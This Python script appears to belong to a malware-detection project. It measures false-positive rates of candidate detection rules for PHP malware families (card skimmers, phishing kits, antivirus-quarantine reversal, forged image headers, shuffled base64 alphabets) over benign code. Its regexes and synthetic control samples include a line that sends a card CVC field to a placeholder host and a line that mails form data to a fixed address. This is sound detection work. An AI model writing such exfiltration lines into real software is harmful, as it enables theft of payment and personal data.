#!/usr/bin/env python3
"""Measure a candidate discriminator's false-positive population before it becomes a rule.

Why this exists
---------------
A rule candidate is normally justified by its recall: "it matches 40 of the 52 samples in
the family". That number is free. The expensive number is the other one — how often the
same shape occurs in ordinary code — and it decides whether the candidate is a rule or a
nuisance. A candidate in this project was killed after it flagged 16,656 rows to reach
2,425, and the reason it got as far as it did is that nobody had measured the denominator
first. See CORPUS_PLAN.md 8 and 11.

So this script answers one question per candidate:

    over a named population of benign files, how many does this shape match?

and reports three things beside the count, because the count alone cannot be read:

  * `examined`  - how many files the candidate was actually offered. CORPUS_PLAN 11's
    degenerate case is a checker that reported 0 problems over a set that was empty.
  * `at risk`   - the sub-population that could possibly have matched. A candidate keyed on
    <meta> tags is not really tested by 200,000 files, it is tested by the few hundred that
    carry <meta> tags at all, and quoting the larger number overstates the check by three
    orders of magnitude.
  * `95% upper bound` - the rule-of-three bound, 3/n, on the true rate when the observed
    count is 0. This is the "state your power" requirement of 11 applied to a zero result:
    zero hits in 10 files bounds nothing (30%), zero in 200,000 bounds it to 0.0015%.

Populations are directory trees named on the command line. The stock CMS trees are the
right population for a candidate keyed on server-side code, and the wrong one for a
candidate keyed on rendered page content, which they contain almost none of; the report
prints the at-risk count so that mismatch is visible rather than assumed.

Usage
-----
    python3 corpus/fp-population.py TREE [TREE...]
    python3 corpus/fp-population.py --list
    python3 corpus/fp-population.py --inject          # positive control, see below

The control
-----------
Every headline result this script produced in review round 10 was a *zero*, and a zero is
exactly the shape of result a broken checker returns. `--inject` synthesises, for each
candidate, a file that the candidate must match, runs the same predicate over it, and fails
if any candidate reports zero on its own positive control. AGENTS.md: a check that has
never been observed to fail is not yet a check.
"""

from __future__ import annotations

import argparse
import os
import re
import sys
import tempfile

PNG_MAGIC = b"\x89PNG\r\n\x1a\n"
GIF_MAGICS = (b"GIF87a", b"GIF89a")

CODE_EXT = (".php", ".inc", ".phtml", ".php5", ".phps", ".module", ".js")
IMAGE_EXT = (".png", ".gif")

_META = re.compile(
    rb'<meta[^>]*name=["\']%s["\'][^>]*content=["\']([^"\']*)["\']', re.I)
_META_REV = re.compile(
    rb'<meta[^>]*content=["\']([^"\']*)["\'][^>]*name=["\']%s["\']', re.I)
_TITLE = re.compile(rb"<title>(.*?)</title>", re.I | re.S)


def _meta(blob: bytes, name: bytes):
    for pat in (_META, _META_REV):
        m = re.search(pat.pattern % name, blob, re.I | re.S)
        if m:
            return m.group(1).decode("utf-8", "replace").strip()
    return None


# --------------------------------------------------------------------------------------
# Candidates.
#
# `at_risk` is deliberately a *separate* predicate from `match`, and it is the field that
# stops a zero from being read as stronger than it is. It answers "could this file ever
# have matched", so the report can say the candidate was tested against 10 files rather
# than against 200,000. Keep it cheap; it runs over every file in the population.
# --------------------------------------------------------------------------------------

def _seo_triple(blob: bytes) -> bool:
    t = _TITLE.search(blob)
    if not t:
        return False
    title = t.group(1).decode("utf-8", "replace").strip()
    kw = _meta(blob, b"keywords")
    desc = _meta(blob, b"description")
    if not (title and kw and desc):
        return False
    return title.lower() == kw.lower() == desc.lower()


def _forged_image_magic(blob: bytes) -> bool:
    """ASCII 'PNG'/'GIF' standing where a real signature belongs.

    Deliberately content-only: in the family that motivated it the forged prefix does not
    track the file's own extension (a .png carrying a 'GIF' prefix and the reverse both
    occur), so keying on agreement between the two loses a third of the samples.
    """
    if blob[:3] == b"PNG":
        return not blob.startswith(PNG_MAGIC)
    if blob[:3] == b"GIF":
        return blob[:6] not in GIF_MAGICS
    return False


_MAIL = re.compile(rb"\bmail\s*\(", re.I)
_POST = re.compile(rb"\$_(POST|REQUEST)\s*\[", re.I)
_ADDR = re.compile(rb"[\"'][A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}[\"']")
_CVC = re.compile(rb"(card[_-]?cvc|card[_-]?cvv|\bcvv2?\b|security[_-]?code)", re.I)
_SINK = re.compile(
    rb"(file_get_contents|curl_exec|curl_setopt|fsockopen|wp_remote_(get|post))", re.I)
_PHPMAILER = re.compile(rb"PHPMailer")
_PWLIT = re.compile(rb"\$password\s*=\s*[\"'][^\"']{4,40}[\"']")
_INC_TXT = re.compile(rb"(?:include|require)(?:_once)?\s*[^;]{0,200}?\.txt", re.I)
# A rename whose SOURCE carries a quarantine suffix and whose TARGET is executable.
# `.suspected` is what cPanel/ImunifyAV appends when it quarantines a file, so this is
# code that reverses an antivirus action. There is no honest reading of it: a legitimate
# program has no reason to know that suffix, still less to undo it.
_UNQUARANTINE = re.compile(
    rb"""rename\s*\(\s*[^,)]*\.(?:suspected|quarantine|infected|virus|malware|bak_av)"""
    rb"""[^,)]*,\s*[^)]*\.(?:php|phtml|php5|inc|module|cgi|pl|py|sh)\b""",
    re.I | re.X)
_RENAME = re.compile(rb"\brename\s*\(", re.I)

_FORM = re.compile(rb"<form", re.I)
_CARDFIELD = re.compile(
    rb"name\s*=\s*[\"'][^\"']*(card|ccnum|cc_num|cvv|cvc|expir|ssn)", re.I)

# A base64 alphabet written down in a non-standard order.
#
# `_B64_SET64` is the 64 characters an implementation needs; the pad is optional, and both
# forms occur in the wild, so both are read. A literal holding each of them exactly once IS
# an alphabet. The standard orderings are the only ones that decode base64, so a permutation
# that is not one of them is a substitution table rather than an implementation.
#
# The at-risk predicate deliberately ADMITS the standard orderings. That is the whole design:
# the near-miss population and the hit population are then the same files, so the count below
# is a discrimination rather than a filter that never met a hard case. Measured over the three
# benign trees, 317 alphabet literals occur and every one is in standard order.
_B64_STD64 = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
_B64_STD65 = _B64_STD64 + b"="
_B64_SET64 = frozenset(_B64_STD64)
_B64_SET65 = frozenset(_B64_STD65)
_B64_RUN = re.compile(rb"""["']([A-Za-z0-9+/=]{64,65})["']""")


def _b64_alphabets(blob: bytes):
    """Every quoted 64- or 65-byte literal that holds each base64 character exactly once."""
    for m in _B64_RUN.finditer(blob):
        lit = m.group(1)
        if len(lit) == 65 and frozenset(lit) == _B64_SET65:
            yield lit
        elif len(lit) == 64 and frozenset(lit) == _B64_SET64:
            yield lit


def _shuffled_b64_alphabet(blob: bytes) -> bool:
    return any(lit not in (_B64_STD64, _B64_STD65) for lit in _b64_alphabets(blob))


# An include/require whose PATH is spliced from two adjacent string literals.
#
# MEASURED AND REJECTED. The argument for it was that the discriminator should be the SPLIT
# rather than the included file's extension: keying on `.txt` was rejected in an earlier
# round at 124 false positives (`REJECTED:include-of-txt`, still measured beside this one so
# the contrast is one report rather than two), and a filename cut between two literals is not
# a filename an author typed. That argument was wrong, and only the measurement says so: the
# split costs 422 false positives over the same three trees - 1.44% of the 29,342 at-risk
# files, and THREE TIMES the candidate it was meant to improve on - to reach 5 samples.
# Splicing a path across literals is ordinary in Magento and in requirejs. Kept here so the
# rejection stays reproducible rather than being re-derived and re-argued next round.
_INC_SPLIT = re.compile(
    rb"""(?:include|require)(?:_once)?\b[^;]{0,200}?"""
    rb"""(?:"[^"]*"|'[^']*')\s*\.\s*(?:"[^"]*"|'[^']*')""",
    re.I | re.X)
_INC_ANY = re.compile(rb"(?:include|require)(?:_once)?\b", re.I)


CANDIDATES = {
    # --- recommended -------------------------------------------------------------------
    "seo-triple": dict(
        blurb="title == meta[keywords] == meta[description], exactly",
        family="seo-doorway (495 rows / 3 templates)",
        at_risk=lambda b, n: _meta(b, b"keywords") is not None
        and _meta(b, b"description") is not None,
        match=lambda b, n: _seo_triple(b),
    ),
    "forged-image-magic": dict(
        blurb="ASCII PNG/GIF prefix where a real signature belongs",
        family="fake-plugin-image-payload-loader (40 payload blobs)",
        at_risk=lambda b, n: b[:3] in (b"PNG", b"GIF") or b.startswith(PNG_MAGIC)
        or b[:6] in GIF_MAGICS or n.lower().endswith(IMAGE_EXT),
        match=lambda b, n: _forged_image_magic(b),
    ),
    "bundled-mailer-behind-password": dict(
        blurb="a bundled PHPMailer plus a hardcoded $password literal",
        family="leaf-php-mailer (29 rows / 2 files)",
        at_risk=lambda b, n: bool(_PHPMAILER.search(b)),
        match=lambda b, n: bool(_PHPMAILER.search(b) and _PWLIT.search(b)),
    ),
    "mail-exfil-to-fixed-address": dict(
        blurb="mail() plus $_POST[...] plus a hardcoded address literal",
        family="phish-kit (14 rows / 7 files / 1 exfil file)",
        at_risk=lambda b, n: bool(_MAIL.search(b)),
        match=lambda b, n: bool(_MAIL.search(b) and _POST.search(b) and _ADDR.search(b)),
    ),
    "unquarantine-rename": dict(
        blurb="rename() from a quarantine suffix back to an executable extension",
        family="seo-doorway deployers (3 files, currently unreviewed and undetected)",
        at_risk=lambda b, n: bool(_RENAME.search(b)),
        match=lambda b, n: bool(_UNQUARANTINE.search(b)),
    ),
    "card-data-to-remote-sink": dict(
        blurb="a CVC/CVV field name reaching a remote-fetch sink in one file",
        family="woocommerce-card-skimmer (1 gateway class)",
        at_risk=lambda b, n: bool(_CVC.search(b)),
        match=lambda b, n: bool(_CVC.search(b) and _SINK.search(b) and _POST.search(b)),
    ),
    "shuffled-base64-alphabet": dict(
        blurb="a 64/65-char base64 alphabet literal written in a non-standard order",
        family="fake-plugin-image-payload-loader (5 .txt second stages) - shipped as OBF042",
        at_risk=lambda b, n: any(True for _ in _b64_alphabets(b)),
        match=lambda b, n: _shuffled_b64_alphabet(b),
    ),
    # --- measured and rejected; kept so the rejection stays reproducible ---------------
    "REJECTED:split-literal-include": dict(
        blurb="include/require with a path spliced from two adjacent literals "
              "(rejected: 422 FPs for 5 samples - WORSE than the extension it replaced)",
        family="fake-plugin loader half",
        at_risk=lambda b, n: n.lower().endswith(CODE_EXT) and bool(_INC_ANY.search(b)),
        match=lambda b, n: bool(_INC_SPLIT.search(b)),
    ),
    "REJECTED:include-of-txt": dict(
        blurb="include/require of a .txt file (rejected: 101 FPs for 2 samples; "
              "re-measured 2026-09-08 over the same three trees: 124)",
        family="fake-plugin loader half",
        at_risk=lambda b, n: n.lower().endswith(CODE_EXT),
        match=lambda b, n: bool(_INC_TXT.search(b)),
    ),
    "REJECTED:embedded-phpmailer": dict(
        blurb="a bundled PHPMailer (rejected: it is ordinary plugin code; this script measures how many)",
        family="leaf-php-mailer",
        at_risk=lambda b, n: n.lower().endswith(CODE_EXT),
        match=lambda b, n: bool(_PHPMAILER.search(b)),
    ),
    "REJECTED:form-with-card-field": dict(
        blurb="a <form> carrying card/ssn field names (rejected: 18 FPs for 1 file)",
        family="phish-kit presentation half",
        at_risk=lambda b, n: b"<form" in b or b"<FORM" in b,
        match=lambda b, n: bool(_FORM.search(b) and _CARDFIELD.search(b)),
    ),
}

MAX_BYTES = 3_000_000


def sweep(roots, names):
    stats = {k: dict(examined=0, at_risk=0, hits=0, examples=[]) for k in names}
    for root in roots:
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                path = os.path.join(dirpath, fn)
                try:
                    if os.path.getsize(path) > MAX_BYTES:
                        continue
                    with open(path, "rb") as fh:
                        blob = fh.read()
                except OSError:
                    continue
                for key in names:
                    cand = CANDIDATES[key]
                    st = stats[key]
                    st["examined"] += 1
                    try:
                        if not cand["at_risk"](blob, fn):
                            continue
                        st["at_risk"] += 1
                        if cand["match"](blob, fn):
                            st["hits"] += 1
                            if len(st["examples"]) < 5:
                                st["examples"].append(path)
                    except Exception as exc:            # a candidate must never abort a sweep
                        print(f"  ! {key} raised on {path}: {exc}", file=sys.stderr)
    return stats


def report(stats, roots):
    print(f"False-positive population: {', '.join(roots)}\n")
    for key, st in stats.items():
        cand = CANDIDATES[key]
        n, risk, hits = st["examined"], st["at_risk"], st["hits"]
        print(f"{key}")
        print(f"    {cand['blurb']}")
        print(f"    target family      {cand['family']}")
        print(f"    examined           {n}")
        print(f"    at risk            {risk}"
              f"   ({100 * risk / n if n else 0:.4f}% of examined)")
        print(f"    false positives    {hits}"
              f"   ({100 * hits / n if n else 0:.5f}% of examined,"
              f" {100 * hits / risk if risk else 0:.4f}% of at-risk)")
        if hits == 0:
            if risk == 0:
                print("    power              NONE: nothing in this population could have "
                      "matched. This is not a pass, it is an untested candidate.")
            else:
                print(f"    power              95% upper bound on the true rate among "
                      f"at-risk files: {300 / risk:.4f}%  (rule of three over {risk})")
        for ex in st["examples"]:
            print(f"    hit  {ex}")
        print()


# --------------------------------------------------------------------------------------
# Positive control.
#
# Each candidate gets a synthesised file it MUST match. A candidate that reports zero here
# is blind, and a blind candidate reporting zero over a real tree is the failure mode
# AGENTS.md was written about.
# --------------------------------------------------------------------------------------

CONTROLS = {
    "seo-triple": ("ctl.html",
                   b"<!doctype html><html><head><title>a b c</title>"
                   b"<meta name=\"keywords\" content=\"a b c\"/>"
                   b"<meta name=\"description\" content=\"a b c\"/></head><body></body></html>"),
    "forged-image-magic": ("ctl.png", b"PNG" + b"QUJDREVGR0g=" * 8),
    "bundled-mailer-behind-password": ("ctl.php",
                                       b"<?php $password = \"0123456789a\";\n"
                                       b"class PHPMailer { public function send() {} }\n"),
    "mail-exfil-to-fixed-address": ("ctl.php",
                                    b"<?php $v = $_POST['x'];\n"
                                    b"mail(\"drop@example.invalid\", \"s\", $v);\n"),
    "unquarantine-rename": ("ctl.php",
                            b"<?php if (file_exists(\"../x.php.suspected\"))\n"
                            b"  rename(\"../x.php.suspected\", \"../x.php\");\n"),
    "card-data-to-remote-sink": ("ctl.php",
                                 b"<?php $c = $_POST['card-cvc'];\n"
                                 b"file_get_contents('http://example.invalid/?d=' . $c);\n"),
    "REJECTED:split-literal-include": ("ctl.php",
                                      b"<?php include_once __DIR__ . \"/pay\" . \"load.txt\";\n"),
    "shuffled-base64-alphabet": ("ctl.php",
                                 b"<?php $a = \"ScsP2Yyn3fOWeZCrDQwJHmEuA4KiVhkBUa1tb9MX"
                                 b"8pF/=GxRz6+qvoLlN0jg75ITd\";\n"),
    "REJECTED:include-of-txt": ("ctl.php", b"<?php include_once __DIR__ . '/payload.txt';\n"),
    "REJECTED:embedded-phpmailer": ("ctl.php", b"<?php class PHPMailer {}\n"),
    "REJECTED:form-with-card-field": ("ctl.html",
                                      b"<form method=post><input name=\"card-number\">"
                                      b"</form>"),
}


def inject():
    print("Positive control: every candidate must match a file built to match it.\n")
    failures = []
    with tempfile.TemporaryDirectory() as tmp:
        for key, (name, blob) in CONTROLS.items():
            cand = CANDIDATES[key]
            path = os.path.join(tmp, name)
            with open(path, "wb") as fh:
                fh.write(blob)
            risk = bool(cand["at_risk"](blob, name))
            hit = bool(cand["match"](blob, name))
            ok = risk and hit
            print(f"  {'PASS' if ok else 'FAIL'}  {key:34s} at_risk={risk!s:5s} match={hit}")
            if not ok:
                failures.append(key)
        missing = sorted(set(CANDIDATES) - set(CONTROLS))
        for key in missing:
            print(f"  FAIL  {key:34s} no positive control defined")
            failures.append(key)
    print()
    if failures:
        print(f"CONTROL FAILED for {len(failures)} candidate(s): {', '.join(failures)}")
        print("A candidate that cannot match its own control cannot be trusted to report "
              "zero over a real tree.")
        return 1
    print(f"All {len(CONTROLS)} candidates matched their control. A zero from this script "
          "over a real tree is therefore a measurement, not a blind pass.")
    return 0


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("roots", nargs="*", help="benign trees to measure against")
    ap.add_argument("--inject", action="store_true",
                    help="run the positive control and exit")
    ap.add_argument("--list", action="store_true", help="list candidates and exit")
    ap.add_argument("--only", action="append", default=None,
                    help="restrict to one candidate (repeatable)")
    args = ap.parse_args()

    if args.list:
        for k, v in CANDIDATES.items():
            print(f"{k:34s} {v['blurb']}")
        return 0
    if args.inject:
        return inject()
    if not args.roots:
        ap.error("give at least one tree to measure, or --inject")

    names = args.only or list(CANDIDATES)
    unknown = [n for n in names if n not in CANDIDATES]
    if unknown:
        ap.error(f"unknown candidate(s): {', '.join(unknown)}")
    report(sweep(args.roots, names), args.roots)
    return 0


if __name__ == "__main__":
    sys.exit(main())
